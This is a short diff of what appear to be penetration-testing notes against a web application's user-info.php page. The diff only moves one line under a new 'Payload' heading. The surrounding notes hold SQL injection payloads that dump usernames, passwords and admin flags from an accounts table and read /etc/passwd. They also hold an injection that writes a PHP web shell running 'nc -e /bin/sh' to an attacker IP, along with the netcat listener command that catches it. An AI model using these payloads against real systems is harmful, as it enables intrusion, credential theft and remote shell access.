@@ -12,7 +12,8 @@
   - ```?page=user-info.php&username=z' union select 1,username,password,is_admin,5 from accounts``` 
   - ```?page=user-info.php&username=z' union select null,load_file('/etc/passwd'),null,null,null``` 
 - Shell upload 
-  - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
+  - Payload 
+    - ```?page=user-info.php&username=z' union select '<?passthru("nc -e /bin/sh 10.20.14.208 8080");?>',null into outfile '/tmp/reverse.php'``` 
   - Listen on attacker machin:
     - nc -vv -l -p 8080
   - Run backdoor
